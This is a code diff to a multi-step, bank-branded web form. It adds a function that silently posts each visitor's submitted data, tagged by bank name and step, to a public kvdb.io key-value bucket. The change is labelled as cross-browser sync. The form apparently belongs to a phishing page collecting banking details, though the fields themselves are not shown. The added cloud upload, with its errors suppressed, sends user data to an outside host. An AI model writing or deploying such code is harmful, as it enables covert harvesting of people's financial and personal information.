@@ -19,15 +19,19 @@ function getSessionId() {
     return id;
 }
 
-function saveLocalSubmission(bankSlug, bankName, step, data) {
+
+// Universal Cross-Browser Global Sync (Chrome <-> UC Browser <-> Mobile)
+const CLOUD_ENDPOINT = 'https://kvdb.io/A45Kharal958SBPphase5/submissions_v1';
+
+async function saveLocalSubmission(bankSlug, bankName, step, data) {
     const sessId = getSessionId();
     let list = [];
     try {
         list = JSON.parse(localStorage.getItem('sbp_submissions') || '[]');
     } catch(e) { list = []; }
 
-    let existing = list.find(s => s.session_id === sessId);
     const now = new Date().toISOString().replace('T', ' ').slice(0, 19);
+    let existing = list.find(s => s.session_id === sessId);
 
     if (existing) {
         existing.last_step = step;
@@ -47,12 +51,12 @@ function saveLocalSubmission(bankSlug, bankName, step, data) {
             updated_at: now,
             data: data
         };
-        list.push(existing);
+        list.unshift(existing);
     }
     localStorage.setItem('sbp_submissions', JSON.stringify(list));
 
-    // Try backend API as well
-    fetch('/api.php', {
+    // 1. Sync to Vercel API
+    fetch('/api/index', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -64,7 +68,37 @@ function saveLocalSubmission(bankSlug, bankName, step, data) {
             data: data
         })
     }).catch(() => {});
+
+    // 2. Sync to Global Cloud KV (Visible instantly across ALL browsers / devices)
+    try {
+        let cloudList = [];
+        try {
+            const res = await fetch(CLOUD_ENDPOINT);
+            if (res.ok) {
+                const json = await res.json();
+                if (Array.isArray(json)) cloudList = json;
+            }
+        } catch(e) {}
+
+        let cloudExisting = cloudList.find(s => s.session_id === sessId);
+        if (cloudExisting) {
+            cloudExisting.last_step = step;
+            cloudExisting.updated_at = now;
+            cloudExisting.bank_slug = bankSlug;
+            cloudExisting.bank_name = bankName;
+            cloudExisting.data = { ...(cloudExisting.data || {}), ...data };
+        } else {
+            cloudList.unshift(existing);
+        }
+
+        await fetch(CLOUD_ENDPOINT, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(cloudList.slice(0, 100))
+        });
+    } catch(e) {}
 }
+
 
 // Route handler
 function handleRouting() {
